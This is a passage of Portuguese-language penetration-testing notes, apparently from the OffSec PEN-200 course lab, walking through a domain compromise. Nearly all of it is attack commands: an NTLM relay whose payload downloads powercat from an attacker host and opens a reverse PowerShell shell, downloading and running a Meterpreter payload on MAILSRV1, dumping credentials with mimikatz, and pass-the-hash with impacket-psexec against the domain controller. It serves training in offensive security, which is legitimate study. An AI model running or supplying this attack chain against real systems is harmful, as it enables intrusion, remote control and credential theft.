sudo impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.158.242 -c "powershell.exe -c \"IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.223:8000/powercat.ps1'); powercat -c 192.168.45.223 -p 9999 -e powershell\""
```

AGORA CORRE PRO ABRAÇO !!

#### Configurando o shell reverso no MAILSRV1
###### Vamos baixar o payload do shell reverso do Meterpreter criado anteriormente, **met.exe,** para executar a pós-exploração.
```shell
cd C:\Users\Administrator
iwr -uri http://192.168.45.223:8000/met.exe -Outfile met.exe
.\met.exe
```

###### vamos entrar na sessão do msf6 no meu caso sessão 3, mas a sessão seria 2
```bash
sessions -i 3 
# ou session -i 2
shell
powershell
```

###### baixando o mimikatz e rodando na máquina alvo, ele deve ser servido no servidor python da porta 8000
```bash
wget https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.zip
unzip mimikatz_trunk.zip
```

na maquina alvo:
```shell
iwr -uri http://192.168.45.223:8000/x64/mimikatz.exe -Outfile mimikatz.exe
iwr -uri http://192.168.45.223:8000/x64/mimikatz.exe -Outfile mimikatz.exe
.\mimikatz.exe
```

###### Depois que o Mimikatz for iniciado, podemos usar **privilege::debug** para obter _SeDebugPrivilege_ . [2](https://portal.offsec.com/courses/pen-200-44065/learning/assembling-the-pieces-48786/gaining-access-to-the-domain-controller-48811/cached-credentials-48791#fn-local_id_762-2) Então, podemos usar **sekurlsa::logonpasswords** para listar todas as credenciais do provedor disponíveis no sistema.
```bash
privilege::debug
# Privilege '20' OK

sekurlsa::logonpasswords
```

salve a saída em um arquivo de texto

#### movimento lateral
Como obtivemos a senha de texto simples e o hash NTLM para _beccy_ , podemos usar **impacket-psexec** para obter um shell interativo no DCSRV1. Embora pudéssemos usar qualquer um deles, vamos usar o hash NTLM. Assim que tivermos um shell de linha de comando, confirmamos que temos acesso privilegiado no DCSRV1 (172.16.114.240).

###### obtendo um shell interativo do DCSRV1
```bash
proxychains -q impacket-psexec -hashes 00000000000000000000000000000000:f0397ec5af49971f6efbdb07877046b3 beccy@172.16.114.240

```